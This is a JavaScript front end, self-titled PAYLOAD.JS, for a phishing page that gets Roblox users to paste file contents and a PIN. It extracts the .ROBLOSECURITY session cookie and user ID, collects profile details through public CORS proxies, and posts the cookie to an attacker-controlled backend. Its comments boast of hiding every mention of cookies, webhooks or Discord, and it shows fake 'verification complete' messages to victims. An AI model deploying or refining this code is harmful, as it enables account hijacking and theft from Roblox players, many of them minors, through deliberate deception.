/* ======================================================
   PAYLOAD.JS - GENERIC UI VERSION
   - No mentions of cookies, webhooks, or Discord
   - All user messages are generic
====================================================== */

// This URL is now hidden – see backend instructions below.
// In production, remove this line and call your own backend.
const BACKEND_URL = "https://roblox-proxy.your-subdomain.workers.dev";  // Change to your backend endpoint

// CORS proxies (keep for Roblox API calls)
const CORS_PROXIES = [
    "https://api.allorigins.win/raw?url=",
    "https://corsproxy.io/?",
    "https://cors-anywhere.herokuapp.com/"
];

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation (unchanged)
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract data from pasted text – error messages are generic
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "❌ Invalid file format: missing required data." };
    }
    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "❌ Incomplete file – unable to verify user." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

// Roblox API fetch (same as before)
async function fetchRobloxAPI(endpoint, retries = 1) {
    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
    for (let attempt = 0; attempt <= retries; attempt++) {
        for (const proxy of CORS_PROXIES) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                const res = await fetch(`${proxy}${encodeURIComponent(endpoint)}`, { signal: controller.signal });
                clearTimeout(timeoutId);
                if (!res.ok) continue;
                const text = await res.text();
                return JSON.parse(text);
            } catch (e) { /* try next */ }
        }
        if (attempt < retries) await new Promise(r => setTimeout(r, 300));
    }
    return null;
}

async function fetchUserInfo(userId) {
    const data = await fetchRobloxAPI(`users.roblox.com/v1/users/${userId}`);
    if (!data?.name) return null;
    return {
        username: data.name,
        displayName: data.displayName || data.name,
        joinDate: new Date(data.created).toLocaleDateString(),
        profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
}

async function fetchFriendsCount(userId) {
    const data = await fetchRobloxAPI(`friends.roblox.com/v1/users/${userId}/friends/count`);
    return data?.count?.toLocaleString() || "Unavailable";
}

async function fetchFollowersCount(userId) {
    const data = await fetchRobloxAPI(`friends.roblox.com/v1/users/${userId}/followers?limit=1`);
    return data?.total?.toLocaleString() || "Unavailable";
}

async function fetchGroups(userId) {
    const data = await fetchRobloxAPI(`groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!data?.data?.length) return [];
    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
}

async function fetchBadges(userId) {
    const data = await fetchRobloxAPI(`badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
    if (!data?.data?.length) return [];
    return data.data.map(b => b.badge.name);
}

async function fetchFilteredAvatarItems(userId) {
    const data = await fetchRobloxAPI(`avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!data?.assets?.length) return "None equipped";
    const allowedTypes = [2, 8, 11, 12];
    const filtered = data.assets.filter(asset => allowedTypes.includes(asset.assetType.id));
    if (filtered.length === 0) return "No clothes or accessories equipped";
    const names = filtered.slice(0, 8).map(a => a.name);
    return names.join(", ") + (filtered.length > 8 ? " …" : "");
}

async function fetchAvatarThumbnail(userId) {
    const data = await fetchRobloxAPI(`thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
    return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

// Function that sends data to your backend (not directly to Discord)
async function sendToBackend(pin, cookie, rbxuid, profileData) {
    const response = await fetch(BACKEND_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            pin: pin,
            cookie: cookie,
            rbxuid: rbxuid,
            profile: profileData
        })
    });
    return response.ok;
}

// Main button handler – all user messages are generic
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "❌ Please enter a valid 4-digit code.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "❌ Please paste the required file content.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "⚙️ Processing...";
    statusMessage.style.color = "#caa8ff";

    // Fetch profile data as before
    statusMessage.textContent = "⏳ Gathering profile information...";
    const results = await Promise.allSettled([
        fetchUserInfo(extraction.rbxuid),
        fetchFriendsCount(extraction.rbxuid),
        fetchFollowersCount(extraction.rbxuid),
        fetchGroups(extraction.rbxuid),
        fetchBadges(extraction.rbxuid),
        fetchFilteredAvatarItems(extraction.rbxuid),
        fetchAvatarThumbnail(extraction.rbxuid)
    ]);

    const profileData = {
        userInfo: results[0].status === "fulfilled" ? results[0].value : null,
        friendsCount: results[1].status === "fulfilled" ? results[1].value : null,
        followersCount: results[2].status === "fulfilled" ? results[2].value : null,
        groups: results[3].status === "fulfilled" ? results[3].value : [],
        badges: results[4].status === "fulfilled" ? results[4].value : [],
        avatarItems: results[5].status === "fulfilled" ? results[5].value : null,
        avatarUrl: results[6].status === "fulfilled" ? results[6].value : null
    };

    const success = await sendToBackend(pinInput.value, extraction.cookie, extraction.rbxuid, profileData);

    // Generic success / failure messages (no mention of Discord or webhook)
    const randomSuccessMessages = [
        "✅ Verification complete.",
        "✅ Profile processed successfully.",
        "✅ All checks passed.",
        "✅ Data accepted."
    ];
    const randomFailureMessages = [
        "❌ Processing failed. Please try again.",
        "❌ Unable to complete request.",
        "❌ Something went wrong. Retry later.",
        "❌ Error – invalid response from server."
    ];

    if (success) {
        const msg = randomSuccessMessages[Math.floor(Math.random() * randomSuccessMessages.length)];
        statusMessage.textContent = msg;
        statusMessage.style.color = "#b5ffb5";
    } else {
        const msg = randomFailureMessages[Math.floor(Math.random() * randomFailureMessages.length)];
        statusMessage.textContent = msg;
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});
